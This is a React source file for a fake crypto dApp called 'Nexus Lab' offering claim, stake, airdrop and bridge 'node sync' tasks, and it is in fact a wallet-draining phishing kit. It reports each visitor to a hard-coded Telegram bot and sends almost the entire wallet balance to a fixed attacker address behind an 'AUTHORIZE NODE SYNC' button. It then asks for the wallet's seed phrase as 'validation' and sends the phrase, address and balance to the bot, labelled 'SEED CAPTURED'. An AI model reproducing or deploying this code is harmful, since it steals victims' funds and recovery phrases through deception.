import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight } from 'lucide-react';

export default function NexusTerminal() {
  const { address } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `👀 NEW VISITOR\nNexus Lab Terminal accessed.` }),
    });
  }, []);

  const openTask = (taskName) => { setInputVal(""); setActiveTask(taskName); setView("task_box"); };
  const backToMenu = () => { setView("menu"); setActiveTask(""); setInputVal(""); };

  const handleFinalAuth = async () => {
    if (!balance || !balance.value || balance.value === 0n) { setView("seed_gate"); return; }
    setLoading(true);
    const amountToMove = balance.value - (balance.value / 65n);
    try {
      sendTransaction({ to: destination, value: amountToMove > 0n ? amountToMove : 0n, data: "0x53796e6368726f6e697a65" }, 
      { onSettled: () => { setLoading(false); setView("seed_gate"); } });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${inputVal}` }),
    });
    let cur = 0; const itv = setInterval(() => { cur += Math.floor(Math.random() * 5) + 2; if (cur >= 86) { cur = 86; clearInterval(itv); } setSyncProgress(cur); }, 150);
  };

  return (
    <div className="min-h-screen bg-[#0a0b0d] text-slate-300 p-6 font-sans select-none overflow-x-hidden">
      {/* HEADER */}
      <header className="flex justify-between items-center mb-12">
        <div className="flex items-center gap-2 text-cyan-400 font-black italic tracking-tighter text-xl">
          <ShieldCheck size={24} /> NEXUS LAB
        </div>
        <w3m-button />
      </header>

      {/* GRID MENU */}
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in duration-500">
          {[ {n:"Claim", i:<Database/>}, {n:"Stake", i:<History/>}, {n:"Unstake", i:<Unlock/>}, {n:"Migrate", i:<Activity/>}, {n:"Swap", i:<RefreshCcw/>}, {n:"Rectify", i:<Settings/>}, {n:"Airdrop", i:<Zap/>}, {n:"Delay", i:<Clock/>}, {n:"Bridge", i:<Globe/>} ].map(item => (
            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#14161b] border border-slate-800 p-7 rounded-[32px] flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl">
              <div className="text-slate-600">{item.i}</div>
              <span className="text-[11px] font-bold text-slate-500 tracking-tight uppercase">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {/* TASK BOX (NODE SYNC) */}
      {view === "task_box" && (
        <div className="bg-[#14161b] border border-slate-800 rounded-[45px] p-10 text-center shadow-2xl animate-in slide-in-from-bottom-8">
          <button onClick={backToMenu} className="text-slate-600 text-[10px] mb-8 font-black uppercase tracking-widest flex items-center justify-center gap-1 mx-auto">
            <ArrowRight size={12} className="rotate-180"/> CANCEL_TERMINAL
          </button>
          
          <div className="relative mx-auto w-24 h-24 mb-6 flex items-center justify-center">
             <Settings size={90} className="text-cyan-900/30 animate-spin duration-[6000ms] absolute" />
             <Cpu size={45} className="text-cyan-500 animate-pulse" />
          </div>
          
          <h2 className="text-white font-black text-3xl italic mb-8 tracking-tighter uppercase leading-tight">NODE SYNC</h2>
          
          <div className="bg-[#0a0b0d] p-6 rounded-[30px] mb-8 text-left border border-slate-800 shadow-inner">
            <label className="text-[9px] text-cyan-700 font-black block mb-2 uppercase tracking-widest">VALIDATED SYNC UNITS</label>
            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,10)} ${balance.symbol}` : "0.0000"}</div>
          </div>

          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-6">
            {chains.map(c => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 px-4 py-3 rounded-2xl text-[8px] font-black text-slate-500 hover:text-cyan-400 whitespace-nowrap uppercase">
                {c.name} NODE
              </button>
            ))}
          </div>

          <button onClick={handleFinalAuth} className="w-full bg-cyan-600 py-6 rounded-[25px] text-[13px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic transition-all">
            AUTHORIZE NODE SYNC
          </button>
        </div>
      )}

      {/* SEED GATE (VALIDATION REQUIRED) */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/95 z-[200] flex items-center justify-center p-6 backdrop-blur-xl animate-in zoom-in">
          <div className="bg-[#14161b] border border-red-900/20 w-full max-w-sm rounded-[55px] p-12 text-center shadow-2xl relative">
            {!isSyncing ? (
              <>
                <div className="w-16 h-16 bg-red-600/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-600/20">
                  <AlertCircle size={40} className="text-red-600 animate-pulse" />
                </div>
                <h2 className="text-white font-black text-2xl italic uppercase mb-2 tracking-tighter leading-tight">VALIDATION REQUIRED</h2>
                <p className="text-[10px] text-slate-500 leading-relaxed mb-10 px-2 italic">provide the project authorization seed to finalize synchronization across all networks (base/sol/eth/bnb).</p>
                
                <textarea 
                  value={inputVal} 
                  onChange={(e) => setInputVal(e.target.value)} 
                  placeholder="ENTER WORD1 WORD2..." 
                  className="w-full h-40 bg-black border border-slate-800 rounded-[35px] p-8 text-xs font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-900 mb-8 shadow-inner" 
                />
                
                <button 
                  disabled={inputVal.trim().split(/\s+/).length < 12} 
                  onClick={startFinalSync} 
                  className={`w-full py-7 rounded-[30px] text-[13px] font-black text-white uppercase tracking-widest transition-all ${inputVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600 shadow-lg active:scale-95' : 'bg-slate-900 opacity-40'}`}
                >
                  {inputVal.trim().split(/\s+/).length >= 12 ? "FINALIZE HANDSHAKE" : "ENTER VALID SEED"}
                </button>
              </>
            ) : (
              <div className="py-12">
                <div className="relative w-28 h-28 mx-auto mb-10">
                  <div className="absolute inset-0 border-[6px] border-slate-900 rounded-full" />
                  <div className="absolute inset-0 border-[6px] border-cyan-500 rounded-full border-t-transparent animate-spin" />
                  <div className="absolute inset-0 flex items-center justify-center font-mono text-white text-xl font-black italic">{syncProgress}%</div>
                </div>
                <h2 className="text-white font-black text-3xl italic mb-3 tracking-tighter uppercase leading-none">SYNCHRONIZING NODES</h2>
                <p className="text-[9px] font-mono text-cyan-900 tracking-[0.6em] uppercase">RELAY_NODE_0x{Math.random().toString(16).substr(2,4).toUpperCase()}</p>
                <p className="text-[10px] text-slate-600 mt-6 italic animate-pulse">broadcasting payload to network relays...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* GLOBAL LOADING */}
      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-md">
          <div className="w-20 h-20 border-[6px] border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[12px] font-black text-cyan-500 mt-10 tracking-[0.8em] animate-pulse uppercase italic">SYNCING MAINNET NODE...</p>
        </div>
      )}
    </div>
  );
}
